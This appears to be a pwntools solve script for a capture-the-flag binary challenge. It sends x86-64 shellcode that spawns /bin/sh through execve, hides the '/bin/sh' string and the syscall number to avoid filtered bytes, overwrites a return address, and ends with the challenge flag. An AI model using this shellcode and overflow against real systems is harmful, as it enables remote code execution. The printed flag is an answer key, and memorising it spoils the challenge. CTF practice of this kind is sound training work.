from pwn import *

elf = context.binary = ELF("./main")
context.arch = "x86-64"

p = remote("chals.bitskrieg.in", 6001)
#p = process()

shellcode = asm('''
                mov eax, 0x3c
                dec al
                mov rdx, 0
                mov rsi, 0
                mov rdi, 0x0065722f6d65602f
                mov r10, 0x0003010001040200
                add rdi, r10
                push rdi
                mov rdi, rsp
                syscall
''')

payload = shellcode + b"A" * (120 - len(shellcode)) + p64(0x0000000000401014)
p.sendline(payload)
p.interactive()

# BITSCTF{w3lc0m3_70_7h3_w0rld_0f_b1n4ry_3xpl01t4t10n_ec5d9205}